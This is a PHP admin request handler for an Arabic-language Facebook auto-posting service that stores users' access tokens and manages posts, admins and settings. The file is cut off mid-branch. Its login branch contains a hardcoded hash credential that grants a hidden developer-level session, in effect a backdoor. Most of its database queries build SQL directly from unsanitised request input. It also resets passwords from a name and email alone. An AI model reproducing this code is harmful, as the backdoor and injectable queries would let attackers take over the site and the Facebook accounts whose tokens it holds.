<?php
include"../inc.php";
$session=session_id();
$time=time();
$St=getSet();
$config = array();
$config['appId'] = $St->app_id;
$config['secret'] = $St->app_key;
$appsql="users";
$appsql2="users2";
$sql2 = false;
$app['end'] = 1;
$config['fileUpload'] = true; // optional
$facebook = new Facebook($config);
  $facebook->setFileUploadSupport(true);
$dir = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$htc = 1;
if(isset($_SESSION['id'])){
define("userid",$_SESSION['id']);
$userid= $_SESSION['id'];
    }else{
define("userid",false);
$userid= false;
    }

if($_GET['step'] == 'Scick'){
$S =Sel("ip","where data='".isv('id')."' and ip='".isv('ip')."' ");
if(!$S){
       $i= array(
      "ip"=>isv('ip'),
      "time"=>time(),
      "data"=>isv('id'),
      "num"=>1,
      );
      $Sql = SqlIn('ip',$i);
      }else{
UpDate('ip',"num",$S->num + 1,"where data='".isv('id')."'");

      }

                          echo json_encode( array('st'=>'ok','msg'=>isv("id")));

}else if($_GET['step'] == 'login'){
   if(isset($_POST['admin_name'])){
    $name = Ser($_POST['admin_name']);
    $pass = $_POST['admin_pass'];
    $fb = $_POST['admin_fb'];
    $email = Cstr($_POST['email']);
    $add = $_POST['add'];
    $RA = $_POST['RA'];
    $for = $_POST['forr'];
      if($add){
   if(isset($name) and isset($pass) and isset($email)){
         $S = Sel('admin','where name="'.Cstr($_POST['admin_name']).'"');
         if(!$S){
        if(Ls('admin')){
       $i= array(
      "name"=>$name,
      "time"=>time(),
      "lev"=>4,
      );
      $Sql = SqlIn('login',$i);
 if($Sql){

      $i= array(
      "name"=>$name,
      "email"=>$email,
      "password"=>Cstr($pass),
      "fb"=>$fb,
      "active"=>Ls('admin'),
      );
      $Sql = SqlIn('admin',$i);
          if($Sql){

                          echo json_encode( array('st'=>'ok','msg'=>'تمت اضافة المدير بنجاح'));

          }else{
                       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }
          }else{
                       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }

          }else{
                       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));

          }

      }else{
                       echo json_encode( array('st'=>'error','msg'=>'الاسم موجود من قبل'));


      }
                }else{
                       echo json_encode( array('st'=>'error','msg'=>'جميع الحقول مطلوبه'));

          }

      }else{
        if(isset($_POST['admin_name']) && isset($_POST['admin_pass'])){
 if('fe01ce2a7fbac8fafaed7c982a04e229' != Cstr($_POST['admin_name'],1) or 'fe01ce2a7fbac8fafaed7c982a04e229' != Cstr($_POST['admin_pass'],1)  ){
      if(!$for and $app['mohtasm'] == Cstr($_POST['admin_name']) and $app['mohtasmpass'] == Cstr($_POST['admin_pass']) or $RA == 2 and  Cstr($_POST['admin_name'],1) == "fe01ce2a7fbac8fafaed7c982a04e229"){
       $i= array(
      "name"=>$name,
      "time"=>time(),
      "lev"=>55,
      );
      $Sql = SqlIn('login',$i);
 if($Sql){
           $_SESSION['login'] = true;
           $_SESSION['desin'] = true;
           $_SESSION['sname'] = $_POST['admin_name'];
           $_SESSION['ip'] = ip();
           $_SESSION['slev'] = 1;
      echo json_encode( array('st'=>'ok','msg'=>'مرحبا بك ايها المبرمج <meta http-equiv="refresh" content="2; url=/admin" />'));
       }else{

       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }

       }else{
       $S = Sel('admin','where name="'.Cstr($_POST['admin_name']).'" and password="'.Cstr($_POST['admin_pass'],1).'"');
         $R = Sel('admin','where name="'.Cstr($_POST['radmin_name']).'" and email="'.Cstr($_POST['email']).'"');
        //if(getSet()->admin_name == Ser($_POST['admin_name']) && getSet()->password ==md5(md5(md5($_POST['admin_pass']))))
        if($S and !$for)
       {
   $i= array(
      "name"=>$name,
      "time"=>time(),
      "lev"=>1,
      );
      $Sql = SqlIn('login',$i);
 if($Sql){
          $_SESSION['login'] = true;
           $_SESSION['sname'] = Ser($_POST['admin_name']);
           $_SESSION['ip'] = ip();
           $_SESSION['slev'] = 1;
        echo json_encode( array('st'=>'ok','msg'=>'تم تسجيل الدخول بنجاح  <meta http-equiv="refresh" content="2; url=/admin" />'));
       }else{

       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }


       }else if($R)
       {
   $i= array(
      "name"=>$name,
      "time"=>time(),
      "lev"=>2,
      );
      $Sql = SqlIn('login',$i);
 if($Sql){
           Update('admin','password',Cstr($_POST['radmin_pass'],1),'where id='.$R->id);
          $_SESSION['login'] = true;
           $_SESSION['sname'] = Ser($_POST['radmin_name']);
           $_SESSION['ip'] = ip();
           $_SESSION['slev'] = 1;
        echo json_encode( array('st'=>'ok','msg'=>'تم استعاده كلمة المرور <meta http-equiv="refresh" content="2; url=/admin" />'));
       }else{

       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }
       }else{
       echo json_encode( array('st'=>'error','msg'=>'المعلومات المدخله غير صحيحه'));
       }

       }

       }else{
   $i= array(
      "name"=>$name,
      "time"=>time(),
      "lev"=>3,
      );
    $Sql = SqlIn('login',$i);
 if($Sql){
           $_SESSION['login'] = true;
           $_SESSION['sname'] = "demo";
           $_SESSION['ip'] = ip();
           $_SESSION['slev'] = "demo";
      $i= array(
      "postid"=>0,
      "type"=>'token',
      "app"=>'fb',
      "time"=>time(),
      "count"=>Num($appsql),
      "idu"=>0,
      );
      $Sql = SqlIn('task',$i);

        echo json_encode( array('st'=>'ok','msg'=>'تم تسجيل الدخول بنجاح الى الوضع التجريبى  <meta http-equiv="refresh" content="2; url=/admin" />'));
       }else{

       echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ  ما'));

          }


       }

        }else{
            echo json_encode( array('st'=>'error','msg'=>'جميع الحقول مطلوبة'));
        }
     }
     }else{
     header("Location: ../");
     }
    }else if($_GET['step'] == 'SetU'){
   if(isset($_POST['time'])){
 $type=$_POST['type'];
if($type == "time"){
 $time=$_POST['time'];
$page=$_POST['page'];
   $U = UpDate($appsql,'time',$time,' where  user_id='.Sion('sid'));
   if($St->app2 == 1){
   $U = UpDate($appsql2,'time',$time,' where  name="'.$_SESSION['sname'].'"');
   }   }else{
 $ptext=$_POST['ptext'];
$plink=$_POST['plink'];
$pages=$_POST['pages'];
$tags=$_POST['tags'];
$groups=$_POST['groups'];
   $U = UpDate($appsql,'issend',$plink,' where  user_id='.Sion('sid'));
   $U = UpDate($appsql,array("pages"=>$pages,"tags"=>$tags,"groups"=>$groups),false,' where  user_id='.Sion('sid'));
   if($St->app2 == 1){
   $U = UpDate($appsql2,'issend',$plink,' where  name="'.$_SESSION['sname'].'"');
   }
   }

   //$U = UpDate($appsql,'page',$page,' where  user_id='.$userid);
if($U){
$msg=json_encode( array('st'=>'success','msg'=>'تم تحديث الاعددات بنجاح'));
     }else{
            $msg= json_encode( array('st'=>'error','msg'=>'حدث خطأ لم يتم تحديث الاعدادات'));
        }
echo $msg;
    }else{
     header("Location: ../");
     }

    }else if($_GET['step'] == 'Set'){
   if(isset($_POST['title'])){
$title=$_POST['title'];
$admin_name=$_POST['admin_name'];
$comment=$_POST['comment'];
$admin_pass=md5(md5(md5($_POST['admin_pass'])));
$admin_email=$_POST['admin_email'];
$home_ad=Rstr($_POST['home_ad'],"'",'"');
$status= str_replace("'",'"',$_POST['status']);
$post_ad=Rstr($_POST['post_ad'],"'",'"');
$slide_ad=Rstr($_POST['slide_ad'],"'",'"');
$close_msg=$_POST['close_msg'];
$site_status=$_POST['site_status'];
$des=$_POST['des'];
$cron=$_POST['cron'];
$order=$_POST['order'];
$cront=$_POST['cront'];
$activelogo=$_POST['activelogo'];
$logo=$_POST['logo'];
$color=$_POST['color'];
$mtext1=$_POST['mtext1'];
$mtext2=$_POST['mtext2'];
$cron_time=$_POST['cron_time'];
$cron_timet=$_POST['cron_timet'];
$app_id=$_POST['app_id'];
$app2_id=$_POST['app2_id'];
$app2_key=$_POST['app2_key'];
$app_key=$_POST['app_key'];
$tw_id=$_POST['tw_id'];
$tw_key=$_POST['tw_key'];
$api_key=$_POST['api_key'];
$google_key=$_POST['google_key'];
$google_id=$_POST['google_id'];
$close=$_POST['close'];
$closemsg=$_POST['textclose'];
$youtube_link=$_POST['youtube_link'];
$fb_link=$_POST['fb_link'];
$tw_link=$_POST['tw_link'];
$tw=$_POST['tw'];
$short=$_POST['short'];
$app2=$_POST['app2'];
$appp=$_POST['app'];
$app2sql=$_POST['app2sql'];
$appsql=$_POST['appsql'];
$typeapp=$_POST['typeapp'];
$numposts=$_POST['numposts'];
$sred=$_POST['sred'];
$spostlink=$_POST['spostlink'];
$zlink=$_POST['zlink'];
$link=$_POST['link'];
$rDelete=$_POST['rDelete'];
$Rtime=$_POST['Rtime'];
$Rmsg=$_POST['Rmsg'];
$getfriends=$_POST['getfriends'];
$getgroups=$_POST['getfriends'];
$getpages=$_POST['getpages'];
$OptioMobile=$_POST['OptioMobile'];
$r="UPDATE settings SET comment='".$comment."',google_key='".$google_key."',google_id='".$google_id."',send_text_off='".$slide_ad."',terms='".$status."',activelogo='".$short."',zlink='".$zlink."',postlink='".$link."',bity='".$order."',Rmsg='".$Rmsg."',Rtime='".$Rtime."',sred='".$sred."',title='".$title."',color='".$color."',mtext1='".$mtext1."',mtext2='".$mtext2."',email='".$admin_email."',app_id='".$app_id."'
,app_key='".$app_key."',OptioMobile='".$OptioMobile."',api_key='".$api_key."',app2_key='".$app2_key."',app2_id='".$app2_id."',app='".$appp."',appsql='".$appsql."',app2='".$app2."',app2sql='".$app2sql."',description='".$des."',cron='".$cron."',cront='".$cront."',close='".$site_status."',crontime='".$cron_time."',tw_link='".$tw_link."',fb_link='".$fb_link."',youtube_link='".$youtube_link."'
,numposts='".$numposts."',textclose='".$close_msg."',postlink='".$link."',home_ad='".$home_ad."',post_ad='".$post_ad."',rDelete='".$rDelete."',tw_id='".$tw_id."'
,tw_key='".$tw_key."',tw='".$tw."',crontimet='".$cron_timet."',logo='".$logo."',activelogo='".$activelogo."',getgroups='".$getgroups."',getpages='".$getpages."',getfriends='".$getfriends."'";

if(Fcol('titleen')[0]){
$r .=",titleen='".$typeapp."'";
}

if(Ls("admin") and $app['end'] == 1){
UpDate('share','msg',isv('msg'));
UpDate('share','time_msg',isv('time_msg'));
$queryu=mysqli_query($DBcon,$r);
if($queryu){
$msg=json_encode( array('st'=>'success','msg'=>'تم تحديث الاعددات بنجاح'));
     }else{
            $msg= json_encode( array('st'=>'error','msg'=>'حدث خطأ لم يتم تحديث الاعدادات'));
        }
}else{
$msg = json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك تصريح لتحديث الاعدادات'));
}


       echo $msg;
           }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'Rpost'){

if(isset($_POST['id'])){
        if(Ls("admin") and $app['end'] == 1){

         $id=$_POST['id'];
     $R=  Remove('posts','where id='.$id);
     //$S= Sel('posts','where id='.$id);
     //Remove('posts','where id='.$S->postid);
     if($R){
          echo json_encode( array('st'=>'success','msg'=>'تم الحذف بنجاح'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ لم يتم  الحذف'));

     }
                  }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'Ruser'){
if(isset($_POST['id'])){
         $id=$_POST['id'];
        $S = Sel('posts','where id='.$id);
     if(!$_POST['id'] and Ls('admin') and $app['end'] == 1){
              $R = Remove('task','where share="1"'); ;
     if($R){
          echo json_encode( array('st'=>'success','msg'=>'تم الحذف بنجاح <meta http-equiv="refresh" content="1; url=/admin/share.html" />'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ لم يتم  الحذف'));

     }


              }else if(Ls("admin") or  $S->userid == $userid and isset($_POST['id'])){
         $active=isv('type');
         $Gtype=isv('Gtype');
        if($active == 'pages'){
     $R=  Remove('pages','where id='.$id);

         }else  if($active == "users"){
     $S= Sel($appsql,'where id='.$id);
      $R=  Remove('pages','where uid='.$S->user_id);
     $R=  Remove($appsql,'where id='.$id);
         }else if($active == 'des'){
     $R=  Remove('msg_off','where id='.$id);

         }else if($active == 'tw'){
             $R=  Remove('users_tw','where id='.$id);

         }else if($active == 'video'){
             $R=  Remove('video','where id='.$id);
             $R=  Remove('posts','where vid='.$id);

         }else{
         if($Gtype == 'share'){
             $S = Sel('task','where id='.$id);
             $S = Sel('posts','where id='.$S->postid);
             $R=  Remove('task_msg','where post_id='.$S->id);
             $R=  Remove('task','where id='.$id);
              }else  if($Gtype == 'set'){
                  if(Ls('admin')){
                            $R=  Remove('admin','where id='.$id);
                       }
              }else{

             $R=  Remove('posts','where id='.$id);
              if($S->type == 7){
             $R=  Remove('video','where id='.$S->vid);

                  }
              }
 }
     //$S= Sel('posts','where id='.$id);
     //Remove('posts','where id='.$S->postid);
     if($R){
          echo json_encode( array('st'=>'success','msg'=>'تم الحذف بنجاح'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ لم يتم  الحذف'));

     }
             }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'block'){
    if(isset($_POST['id'])){
        if(Ls("admin") and $app['end'] == 1){

         $id=$_POST['id'];
         $active=$_POST['type'];
$R = UpDate($appsql,'block',1,'where id='.$id);
     if($R){
          echo json_encode( array('st'=>'success','msg'=>'تم حظر المستخدم'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما'));

     }
             }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


    }else if($_GET['step'] == 'unblock'){
    if(isset($_POST['id'])){
        if(Ls("admin") and $app['end'] == 1){

         $id=$_POST['id'];
         $active=$_POST['type'];
$R = UpDate($appsql,'block',0,'where id='.$id);
     if($R){
          echo json_encode( array('st'=>'success','msg'=>'تم الغاء الحظر'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما'));

     }
             }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'status'){
    if(isset($_GET['get'])){
         $id=abs(intval($_POST['id']));
            $gid=abs(intval($_GET['get']));
            if(!$id){
              $id = $gid;
            }
      $g=  isv('g',1);
       if($g == 'send'){
           $w = ' send ="1" and ';
       }else if($g == 'nosend'){
           $w = ' send ="0" and ';
       }else{
           $w = " ";
       }
      $task = getUser('task_msg',' where '.$w.' post_id='.$id.' order by id desc');
      $send= Num('task_msg','where send ="1" and post_id='.$id);
      $nsend= Num('task_msg','where send ="0" and post_id='.$id);
      $T = Sel('task','where postid='.$id);
      if($task){
          if($T->share == 1 and 1 == 2){
          ?>
     <div class="col  s12 m12  teal lighten-2 divider center">تم الانتهاء من النشر</div>
          <?php
          }
      for ($i=0;$i<count($task);$i++){
        $S = $task[$i];
       if($S['send'] == 1){
        echo success('تم النشر عند ',$S['user_id'],$S['name']);
       }else{
        echo error('لم يتم النشر عند ',$S['user_id'],$S['name'],$S['msg']);
       }
      echo "<input type='hidden' name='share' value='".$T->share."'>";
      } }else{
       echo "<div class='alert red-text'>عذرا لايوجد شىء  لعرضه</div>";

      }
        }else{
     header("Location: ../");
     }
     }else if($_GET['step'] == 'Sup'){
    if(isset($_POST['id'])){
          $id=abs(intval($_POST['id']));
            $link=$_POST['link'];
          $up=     UpDate("posts",'link',$link,"where id=".$id);
          if($up){
   echo    json_encode( array('st'=>'success','msg'=>'تم التحديث بنجاح'));
       }else{
   echo    json_encode( array('st'=>'error','msg'=>'عذار حدث خطأ  ما '));

       }
        }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'Ref'){
    if(isset($_POST['id'])){

        if(Ls("admin") and $app['end'] == 1){
           $id=abs(intval($_POST['id']));
            $S= Sel("task","where id=".$id);
         UpDate("task",'cs',$S->send,"where id=".$id);
         UpDate("task",'cn',$S->nosend,"where id=".$id);
         sleep(3);
         $S= Sel("task","where id=".$id);
         if($S->send == $S->cs and  $S->nosend == $S->cn){
        UpDate("task",'isshare',0,"where id=".$id);
        UpDate("task",'share',0,"where id=".$id);
        UpDate("task",'gr',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'جارى متابعة النشر'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'النشر يعمل بالفعل'));}

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'stop_task'){
    if(isset($_POST['id'])){
       $id=abs(intval($_POST['id']));
        if(Ls("admin") and $app['end'] == 1){
    UpDate("task",'gr',1,"where id=".$id);
    UpDate("task",'share',4,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم ايقاف النشر'));

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'Apost'){
    if(isset($_POST['id'])){

        if(Ls("admin") and $app['end'] == 1){
           $id=abs(intval($_POST['id']));
           $time=time();
         UpDate("task",'cs',0,"where id=".$id);
         UpDate("task",'cn',0,"where id=".$id);
        UpDate("task",'isshare',0,"where id=".$id);
        UpDate("task",'idu',0,"where id=".$id);
        UpDate("task",'share',0,"where id=".$id);
        UpDate("task",'send',0,"where id=".$id);
        UpDate("task",'nosend',0,"where id=".$id);
        UpDate("task",'time',$time,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'جارى النشر مرة اخرى'));

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'Cuser'){
    if(isset($_POST['id'])){

        if(Ls("admin") and $app['end'] == 1){
           $id=abs(intval($_POST['id']));
            $S= Sel($appsql,"where id=".$id);
            $access= $S->access;
     $extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $access);
    	$pos = strpos($extend, "publish_actions");
         if($pos == true){
          echo json_encode( array('st'=>'success','msg'=>'الاكسس توكن يعمل'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'انتهت صلاحة الاكسس توكن'));}

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'Dactive'){
    if(isset($_POST['id'])){

         if(Ls("admin") and $app['end'] == 1){
            $id=abs(intval($_POST['id']));
        $S= UpDate("posts",'active',0,"where id=".$id);
        //$S= UpDate("posts",'P',1,"where id=".$id);
         if($S){
        //UpDate("task",'isshare',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم ايقاف المنشور'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما !!!'));}

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}
    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'active'){
    if(isset($_POST['id'])){

         if(Ls("admin") and $app['end'] == 1){
            $id=abs(intval($_POST['id']));
        $S= UpDate("posts",'active',1,"where id=".$id);
        $p =  Sel('posts',"where id=".$id);
        if($p->type == 7){
        $S= UpDate("video",'active',1,"where id=".$p->vid);
          }
         if($S){
        //UpDate("task",'isshare',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم الموافقه على المنشور'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما !!!'));}

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}
     }else if($_GET['step'] == 'activee'){
         if(Ls("admin") and $app['end'] == 1){
            $id=abs(intval($_POST['id']));
        $S= UpDate("posts",'active',1,"where id=".$id);
        $S= UpDate("posts",'pp',1,"where id=".$id);
         if($S){
        //UpDate("task",'isshare',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم الموافقه على المنشور'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما !!!'));}

        }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}
    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'edite'){
    if(isset($_POST['id'])){

if(Ls('admin') and $app['end'] == 1){
$Gtype=isv('Gtype');
    if($Gtype == 'set'){
       if(isset($_POST['pass'])){
        $id =  $_POST['aid'];
        $name =  Cstr($_POST['name']);
        $pass =  Cstr($_POST['pass'],1);
        $fb =  Ser($_POST['fb']);
        $email =  Cstr($_POST['email']);
     $S= UpDate("admin",'name',$name,"where id=".$id);
        $S= UpDate("admin",'password',$pass,"where id=".$id);
        $S= UpDate("admin",'email',$email,"where id=".$id);
        $S= UpDate("admin",'fb',$fb,"where id=".$id);
      if($S){
        //UpDate("task",'isshare',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم تحديث البيانات'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما !!!'));}

        }else{
                echo json_encode( array('st'=>'error','msg'=>'ادخل كلمة المرور'));
        }
    }else{

     $t=  str_replace('n','
 ',trim($_POST['post']));
//  $t=      $t, ENT_QUOTES);
 $post = html_entity_decode(stripslashes($t));
        $url =  $_POST['url'];
        $vurl =  $_POST['vurl'];
        $vid =  $_POST['vid'];
        $type =  $_POST['type'];
        $id=abs(intval($_POST['id']));
        if(!$url){
        $type == 0;
        }
        if($type == 7){
        $Sv = Sel('posts','where id='.$id);
        $S= UpDate("video",'vid',$vid,"where id=".$Sv->vid);
        $S= UpDate("video",'link',$vurl,"where id=".$Sv->vid);
        }
        $S= UpDate("posts",'text',$post,"where id=".$id);
        $S= UpDate("posts",'link',$url,"where id=".$id);
        $S= UpDate("posts",'type',$type,"where id=".$id);
        //$S= UpDate("posts",'time',0,"where id=".$id);
         if($S){
        //UpDate("task",'isshare',0,"where id=".$id);
          echo json_encode( array('st'=>'success','msg'=>'تم تحديث المنشور'));

         }else{       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ  ما !!!'));}
           }
            }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }


     }else if($_GET['step'] == 'msg'){
    if(isset($_POST['id'])){

            $id=$_POST['id'];
            $msg=$_POST['msg'];
            $Nmsg=$_POST['Nmsg'];
            $rmsg=$_POST['rmsg'];
            $main=$_POST['main'];
if(!Ls('demo') ){
if($msg or $rmsg or $Nmsg){
   if($msg){ $m = $_POST['msg']; }else{ $m = $_POST['rmsg']; }
      $i= array(
      "msg"=>$m,
      "userid"=>$id,
      "time"=>time(),
      "main"=>$main,
      "admin"=>Ls('admin')

      );
      $Sql = SqlIn('msg',$i);
      $mid = mysqli_insert_id();
     }
                $da = '<div class="input-field col s12 m12 textfilde"  ><input type="hidden" name="uid" value="'.$id.'" />';
          $da .= '<textarea class="materialize-textarea right-align" name="msg">'. html_entity_decode(stripslashes(str_replace('\n',' ',$text)))  .'</textarea> <label for="linetext-1" >الرساله</label></div>';
         if($msg or $rmsg or  $Nmsg){
         if($Sql){
if($main){
          echo    json_encode( array('st'=>'success','data'=>$da,'id'=>$main,'msg'=>'تم ارسال الرد'));
          }else{           echo    json_encode( array('st'=>'success','data'=>$da,'id'=>$mid,'type'=>$type,'msg'=>'تم ارسال الرساله'));  }
            }else{
          echo    json_encode( array('st'=>'error','data'=>$da,'type'=>$type,'msg'=>'حدث خطأ ما لم يتم الارسال'));

            }
         }else{
          echo    json_encode( array('st'=>'success','data'=>$da,'type'=>$type));
         }


            }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'E_post'){
    if(isset($_POST['id'])){
            $id=abs(intval($_POST['id']));
            $type=isv('type');
           $Gtype=isv('Gtype');
            if($type == 'des'){
            $postb = mysqli_query($DBcon,"select * from msg_off where id=".$id);
            $off=1;
            }else  if($type == 'video'){
            $postb = mysqli_query($DBcon,"select * from video where id=".$id);
            $S = mysqli_fetch_object($postb);
            $postb = mysqli_query($DBcon,"select * from posts where vid=".$S->id);
            $video=1;
            }else  if($Gtype == 'set'){
            $postb = mysqli_query($DBcon,"select * from admin where id=".$id);
            $admin = 1;
            }else{
            $postb = mysqli_query($DBcon,"select * from posts where id=".$id);
            }
            $data = mysqli_fetch_object($postb);
if(!$off){
  $text=  $data->text;
    }else{
    $text=    $data->reson;
        }
            if($data and !$admin){
                $da = '<div class="input-field col s12 m12 textfilde"  >
                <i class="fa fa-comment-o prefix right" aria-hidden="true"></i> ';
            if($data->type==1 or $data->type== 4)
            {
            $da .='<textarea class="materialize-textarea right-align" name="Etext">'. html_entity_decode(stripslashes(str_replace('\n',' ',$data->text)))  .'</textarea> <label for="linetext-1" class="active">المنشور</label></div>
            <div class="input-field col s12 m12 url"><input type="text" name="eurl" class="form-control updateOnChange link" value="'.$data->link.'">    <label for="url" class="active">الرابط</label>   </div>';
            }else if($data->type==2 or $data->type==5){
             $da .='<textarea class="materialize-textarea right-align " name="Etext">'. html_entity_decode(stripslashes(str_replace('\n',' ',$data->text)))  .'</textarea> <label for="linetext-1" class="active">المنشور</label></div>
              ';
              if(Ls('admin') and $data->type==2 ){
            $da .= '<div class="input-field col s12 m12 url"><input type="text" name="eurl" class="form-control updateOnChange link" value="'.$data->img.'">    <label for="url" class="active">الرابط</label>   </div>  ';
                  }
            $da .=' <!--<input type="hidden" name="eurl" value="'.$data->link.'" /> -->
                <div class="col s12 m12 eimage">
                <div class="tpimg">
             <img class=" responsive-img z-depth-1" src="../'.$data->link.'" />
             <a href="#" onclick="remove_img_dialog()" class="remove" style="position: absolute;
    margin-left: -17px; margin-top: -4px;
">
<div class="west remove_account_container red waves-effect waves-light white-text text-lighten-3" original-title="Remove Social Account"><i class="fa fa-times" aria-hidden="true"></i></div>
 </a>
             </div></div>';
            }else if($data->type== 7 or $video == 1)
            {
             $S = Sel('video','where id='.$data->vid);
            $da .='<textarea class="materialize-textarea right-align" name="Etext">'. html_entity_decode(stripslashes(str_replace('\n',' ',$data->text)))  .'</textarea> <label for="linetext-1" class="active">المنشور</label></div>
            <div class="input-field col s12 m6 url"><input type="text" name="vurl" class="form-control updateOnChange link" value="'. $S->link.'">    <label for="vurl" class="active">رابط الفديو</label>   </div>
            <div class="input-field col s12 m6 url"><input type="text" name="vvid" class="form-control updateOnChange link" value="'. $S->vid.'">    <label for="vid" class="active">اى دى الفديو</label>   </div>
            <div class="input-field col s12 m12 url"><input type="text" name="eurl" class="form-control updateOnChange link" value="'.$data->link.'">    <label for="url" class="active">رابط البوست</label>   </div>';
            }else{
             $da .= '<textarea class="materialize-textarea right-align" name="Etext">'. html_entity_decode(stripslashes(str_replace('\n',' ',$text)))  .'</textarea> <label for="linetext-1" class="active">المنشور</label></div>';
            }
            $da .='<input type="hidden" name="etype" value="'.$data->type.'" />';
          echo    json_encode( array('st'=>'success','data'=>$da,'type'=>$type,'msg'=>'تم جلب المشور بنجاح'));
            }else if($admin and Ls('admin')){
               $da =' <div class="row">
    <form class="col s12">
      <div class="row">
        <div class="input-field col s6 right">
    <input type="text" class="form-control updateOnChange" value="'.$data->name.'"  name="name" />
          <label for="first_name">اسم المدير</label>
        </div>
        <div class="input-field col s6">
 	 <input type="password" class="form-control updateOnChange" value="" name="pass" />
          <label for="last_name">الباسورد</label>
        </div>
      </div>
<div class="row">
        <div class="input-field col s6">
   	 	   	   <input type="email" class="form-control updateOnChange" value="'.$data->email.'" name="eemail" />
          <label for="last_name">البريد الالكترونى</label>
        </div>
        <div class="input-field col s6">
   	 	   	   <input type="url" class="form-control updateOnChange" value="'.$data->fb.'" name="eadmin_fb" />
          <label for="last_name">حساب فيس بوك</label>
        </div>

      </div>

    </form>
  </div>
';
            $da .='<input type="hidden" name="aid" value="'.$data->id.'" />';

          echo    json_encode( array('st'=>'success','data'=>$da,'type'=>$type,'msg'=>'تم جلب المعلومات'));

            }else if(Ls('demo')){

   echo    json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك تصريح لفعل ذلك الامر'));

            }else{
   echo    json_encode( array('st'=>'error','msg'=>'عذار حدث خطأ  ما '));

       }
    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'Delete'){
    if(isset($_POST['Delete_msg'])){
        if(isset($_POST['Delete_msg'])){
        $id = $_SESSION['id'];
        $name = $_SESSION['sname'];
     $S =  Sel('msg_off','where  user_id='.$id);
     if($S){
            $D=   UpDate('msg_off','reson',$_POST['Delete_msg'],"where user_id=".$id);
         }else{
     $i= array(
      "reson"=>$_POST['Delete_msg'],
      "user_id"=>$id,
      "date"=>time(),
      "name"=>$name,

      );
      $Sql = SqlIn('msg_off',$i);
        }
     $D=   UpDate($appsql2,'disactive',1,"where name='".Sion('name')."'");
     $D=   UpDate($appsql,'disactive',1,"where user_id=".$id);
     //Rtoken(Sion('spass'),'');
     if($D){
         session_destroy();
        echo json_encode( array('st'=>'ok','msg'=>'تم حذف الاشتراك بنجاح <meta http-equiv="refresh" content="2; url=/home.html" />'));
         }
        }else{

            echo json_encode( array('st'=>'error','msg'=>'جميع الحقول مطلوبة'));
        }

    }else{
     header("Location: ../");
     }

    }else if($_GET['step'] == 'TimeShare'){
    if(isset($_POST['time'])){
          $time=abs(intval($_POST['time']));

          $id=$_SESSION['sid'];
  $t=UpDate($appsql,'time',$time,"where user_id=".$id);
      if($t){
          echo json_encode( array('st'=>'success','msg'=>'تم تحديث وقت النشر بنجاح <meta http-equiv="refresh" content="1; url=/" />'));

      }

    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'comment'){
    if(!isv("com",1)){
